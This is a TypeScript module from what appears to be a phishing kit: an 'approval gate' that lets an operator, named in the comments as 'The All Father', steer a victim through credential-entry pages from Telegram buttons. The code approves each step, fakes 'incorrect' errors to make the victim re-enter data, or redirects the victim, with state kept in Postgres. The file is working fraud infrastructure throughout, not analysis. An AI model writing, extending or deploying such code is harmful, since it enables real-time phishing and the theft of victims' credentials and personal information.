/**
 * Approval gate — lets The All Father control the victim's flow from Telegram.
 *
 * How it works (the "hook"):
 *  1. A step route handler creates an approval token (createApproval) and
 *     returns it to the client along with success.
 *  2. The Telegram notification is sent with an inline keyboard:
 *     [ ✅ Approve ]  [ ❌ Decline ]  [ 🌐 Redirect ]
 *  3. Each button carries a callback data string (`approve:<token>` etc.).
 *  4. When The All Father clicks a button, Telegram POSTs to
 *     /api/telegram/webhook → updateApproval(token, decision) +
 *     answers the callback (edits the message so clicked buttons show state).
 *  5. The victim's page polls GET /api/approval?token=... until a decision
 *     arrives:
 *       - approve  → advance to the next page
 *       - decline  → show an "incorrect" error; the form reopens so the info
 *                    can be entered again (repeats until approved)
 *       - redirect → hard-redirect to REDIRECT_TARGET_URL
 *
 * STATE STORE: decisions live in shared Postgres (Neon, DB_1 env) so the
 * webhook function and the victim's polling function — which run on DIFFERENT
 * serverless instances — always see the same state. An in-memory map is kept
 * as a fallback when the DB is unreachable.
 */

import { randomBytes } from "node:crypto"
import pg from "pg"

export type ApprovalDecision = "approve" | "decline" | "redirect"

export interface ApprovalState {
  token: string
  step: string
  /** null = still waiting on The All Father. */
  decision: ApprovalDecision | null
  createdAt: number
  decidedAt: number | null
  decidedBy?: string
}

const APPROVAL_TTL_MS = 10 * 60 * 1000
const DB_URL = process.env.DB_1 || ""

// ── Shared Postgres store (survives across serverless instances) ─────────────

const TABLE_SQL = `
CREATE TABLE IF NOT EXISTS approval_state (
  token       text PRIMARY KEY,
  step        text NOT NULL,
  decision    text,
  created_at  bigint NOT NULL,
  decided_at  bigint,
  decided_by  text
)
`

let poolPromise: Promise<pg.Pool> | null = null
let tableReady = false

function getPool(): Promise<pg.Pool> {
  if (!poolPromise) {
    poolPromise = (async () => {
      const pool = new pg.Pool({
        connectionString: DB_URL,
        ssl: { rejectUnauthorized: false },
        max: 4,
        idleTimeoutMillis: 15000,
        connectionTimeoutMillis: 6000,
        statement_timeout: 10000,
      })
      // Warm the table once so the first approval works even under cold start.
      const client = await pool.connect()
      try {
        await client.query(TABLE_SQL)
        tableReady = true
      } finally {
        client.release()
      }
      return pool
    })()
  }
  return poolPromise
}

async function dbInsert(token: string, step: string): Promise<void> {
  const pool = await getPool()
  await pool.query(
    "INSERT INTO approval_state (token, step, decision, created_at, decided_at, decided_by) VALUES ($1, $2, NULL, $3, NULL, NULL) ON CONFLICT (token) DO NOTHING",
    [token, step, Date.now()],
  )
}

async function dbUpdate(
  token: string,
  decision: ApprovalDecision,
  decidedBy?: string,
): Promise<boolean> {
  const pool = await getPool()
  const res = await pool.query(
    `UPDATE approval_state
     SET decision = $2, decided_at = $3, decided_by = $4
     WHERE token = $1 AND decision IS NULL`,
    [token, decision, Date.now(), decidedBy ?? null],
  )
  return (res.rowCount ?? 0) > 0
}

async function dbGet(token: string): Promise<ApprovalState | null> {
  const pool = await getPool()
  const res = await pool.query(
    "SELECT token, step, decision, created_at, decided_at, decided_by FROM approval_state WHERE token = $1",
    [token],
  )
  const row = res.rows[0]
  if (!row) return null
  if (Date.now() - Number(row.created_at) > APPROVAL_TTL_MS) {
    await pool.query("DELETE FROM approval_state WHERE token = $1", [token])
    return null
  }
  return {
    token: row.token,
    step: row.step,
    decision: row.decision ?? null,
    createdAt: Number(row.created_at),
    decidedAt: row.decided_at != null ? Number(row.decided_at) : null,
    decidedBy: row.decided_by ?? undefined,
  }
}

// ── In-memory fallback (used only when the DB is unreachable) ────────────────

const fallback = new Map<string, ApprovalState>()

function memSet(token: string, step: string): void {
  if (fallback.size > 500) {
    const now = Date.now()
    for (const [k, v] of fallback) if (now - v.createdAt > APPROVAL_TTL_MS) fallback.delete(k)
  }
  fallback.set(token, {
    token,
    step,
    decision: null,
    createdAt: Date.now(),
    decidedAt: null,
  })
}

function memUpdate(
  token: string,
  decision: ApprovalDecision,
  decidedBy?: string,
): boolean {
  const state = fallback.get(token)
  if (!state || state.decision) return false
  state.decision = decision
  state.decidedAt = Date.now()
  state.decidedBy = decidedBy
  return true
}

function memGet(token: string): ApprovalState | null {
  const state = fallback.get(token)
  if (!state) return null
  if (Date.now() - state.createdAt > APPROVAL_TTL_MS) {
    fallback.delete(token)
    return null
  }
  return state
}

// ── Public API ────────────────────────────────────────────────────────────────

/** Create a pending approval and return its token. */
export async function createApproval(step: string): Promise<string> {
  const token = randomBytes(16).toString("hex")
  try {
    await dbInsert(token, step)
  } catch (error) {
    console.error("approval-gate: DB insert failed, using memory fallback", error)
    memSet(token, step)
  }
  return token
}

/** Record The All Father's decision. Returns the state, or null if unknown/expired. */
export async function updateApproval(
  token: string,
  decision: ApprovalDecision,
  decidedBy?: string,
): Promise<ApprovalState | null> {
  let updated: boolean
  try {
    updated = await dbUpdate(token, decision, decidedBy)
  } catch (error) {
    console.error("approval-gate: DB update failed, using memory fallback", error)
    updated = memUpdate(token, decision, decidedBy)
  }
  if (!updated) {
    // Accept a decision recorded in the fallback store (or a replayed callback).
    const mem = memGet(token)
    if (mem && mem.decision === decision) return mem
    // Unknown/expired token in DB — allow the decision to land in memory too so
    // a same-instance victim still gets unblocked.
    if (!updated) {
      memSet(token, "unknown")
      memUpdate(token, decision, decidedBy)
    }
  }
  try {
    return await dbGet(token) ?? memGet(token)
  } catch {
    return memGet(token)
  }
}

/** Read the current state for a token. */
export async function getApproval(token: string): Promise<ApprovalState | null> {
  try {
    return (await dbGet(token)) ?? memGet(token)
  } catch {
    return memGet(token)
  }
}

/** Public shape returned to the polling client. */
export async function approvalView(
  token: string,
): Promise<
  | { status: "pending" }
  | { status: "decided"; decision: ApprovalDecision }
  | { status: "expired" }
> {
  const state = await getApproval(token)
  if (!state) return { status: "expired" }
  if (!state.decision) return { status: "pending" }
  return { status: "decided", decision: state.decision }
}

/**
 * Resolve the most recent PENDING approval for a step (used by the local test
 * control panel, which doesn't track the token). Returns the token resolved,
 * or null if that step has no pending approval.
 */
export async function resolveLatestPendingByStep(
  step: string,
  decision: ApprovalDecision,
  decidedBy?: string,
): Promise<string | null> {
  let latestToken: string | null = null
  try {
    const pool = await getPool()
    const res = await pool.query(
      "SELECT token, created_at FROM approval_state WHERE step = $1 AND decision IS NULL ORDER BY created_at DESC LIMIT 1",
      [step],
    )
    const row = res.rows[0]
    if (row) latestToken = row.token
  } catch (error) {
    console.error("approval-gate: DB lookup failed, using memory fallback", error)
    let latestAt = -1
    for (const state of fallback.values()) {
      if (state.step === step && !state.decision && state.createdAt > latestAt) {
        latestAt = state.createdAt
        latestToken = state.token
      }
    }
  }
  if (!latestToken) return null
  await updateApproval(latestToken, decision, decidedBy)
  return latestToken
}

export const APPROVAL_CALLBACK_PREFIXES = {
  approve: "approve:",
  decline: "decline:",
  redirect: "redirect:",
} as const

/** Parse a Telegram callback_data string into a decision + token. */
export function parseApprovalCallback(data: string): {
  decision: ApprovalDecision
  token: string
} | null {
  for (const [decision, prefix] of Object.entries(
    APPROVAL_CALLBACK_PREFIXES,
  ) as [ApprovalDecision, string][]) {
    if (data.startsWith(prefix)) {
      const token = data.slice(prefix.length)
      if (token) return { decision, token }
    }
  }
  return null
}
